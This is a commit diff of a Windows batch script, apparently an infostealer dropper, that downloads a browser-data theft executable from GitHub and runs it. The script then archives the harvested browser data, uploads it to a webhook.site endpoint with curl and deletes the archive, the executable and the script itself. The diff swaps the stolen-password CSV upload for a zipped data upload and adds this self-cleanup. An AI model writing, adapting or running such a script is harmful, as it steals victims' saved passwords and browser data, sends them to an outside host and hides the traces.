4da69bfd4087917380957dbf4653cde6e432a63d
AmirX-Dead <amiraligoodarzy2@gmail.com>
2026-09-04 20:27:41 +0330

    Send.bat

--- Send.bat
+++ Send.bat
@@ -1,14 +1,19 @@
 ::file url
-set "file_url=https://raw.githubusercontent.com/AmirX-Dead/Aa/refs/heads/main/decrypt_chrome_password.exe" 
+set "file_url=https://raw.githubusercontent.com/AmirX-Dead/File/refs/heads/main/hack-browser-data.exe" 
 
 ::comment it if you are not using DDNS!!
 ::set "ddns=x.example.com"
 
-set "https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513"
+set "webhook_url=https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513"
 ::comment it if you are not using DDNS!!
 ::for /f "tokens=2,* " %%w in ('curl -I %ddns% ^| findstr "Location:"') do (set "webhook_url=%%w")
 
 curl %file_url% -o run.exe
 start run.exe
 timeout /T 5 /NOBREAK
-curl %webhook_url% -F chrome_passwords=@decrypted_password.csv
+tar -a -c -f data.zip results && rmdir /S /Q results
+curl %webhook_url% -F chrome_data=@data.zip
+timeout /T 2 /NOBREAK
+del data.zip
+del run.exe
+del Send.bat
